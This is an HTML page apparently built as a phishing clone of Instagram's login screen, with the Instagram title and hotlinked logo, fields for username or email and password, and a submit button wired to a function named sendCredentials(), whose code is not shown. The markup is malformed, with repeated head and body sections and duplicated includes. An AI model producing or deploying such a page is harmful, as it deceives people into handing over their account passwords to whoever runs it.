
<!doctype html>
<html>
<head>
<title>Login â€¢ Instagram</title>
  <meta name="description"
   content="Welcome back to instagram. Sign in to check out what your friends, family & interests have been capturing & sharing around the world.">
  <link rel="stylesheet"
   href="style.css">
 </head>
 <body>
  
  <script src="script.js"></script>
  
  <link rel="stylesheet"
   href="style.css">
  </head>
  <body>
   
   <script src="script.js"></script>
   
   <link rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
   <style>
    body {
     background-color: #fafafa;
     font-family: Arial, sans-serif;
    }
    
    .container {
     max-width: 400px;
     margin: 0 auto;
     padding: 20px;
     border: 1px solid #dbdbdb;
     background-color: #fff;
    }
    
    .logo {
     margin-bottom: 20px;
     text-align: center;
    }
    
    .logo img {
     width: 150px;
    }
    
    .title {
     text-align: center;
     font-size: 20px;
     margin-bottom: 20px;
     color: #262626;
    }
    
    form {
     display: flex;
     flex-direction: column;
    }
    
    label {
     font-size: 14px;
     color: #999;
     margin-bottom: 5px;
    }
    
    input[type="text"],
    input[type="password"] {
     padding: 10px;
     border: 1px solid #dbdbdb;
     border-radius: 3px;
     margin-bottom: 10px;
    }
    
    input[type="button"] {
     padding: 10px;
     font-size: 16px;
     font-weight: bold;
     color: #fff;
     background-color: #3897f0;
     border: none;
     border-radius: 3px;
     cursor: pointer;
    }
    
    input[type="button"]:hover {
     background-color: #2271b3;
    }
   </style>
   </head>
   <body>
    <div class="container">
     <div class="logo">
      <img
       src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png"
       alt="Instagram Logo">
     </div>
     
     <form>
      <label for="email">Phone number,
       username or email:</label>
      <input type="text" id="email"
       name="email" required>
      
      <label
       for="password">Password:</label>
      <input type="password"
       id="password" name="password"
       required>
      
      
      <input type="button"
       value="Submit"
       onclick="sendCredentials()">
     </form>
    </div>
    
    <script
     src="https://code.jquery.com/jquery-3.6.0.min.js">
    </script>
     
     </body>
    
</html>
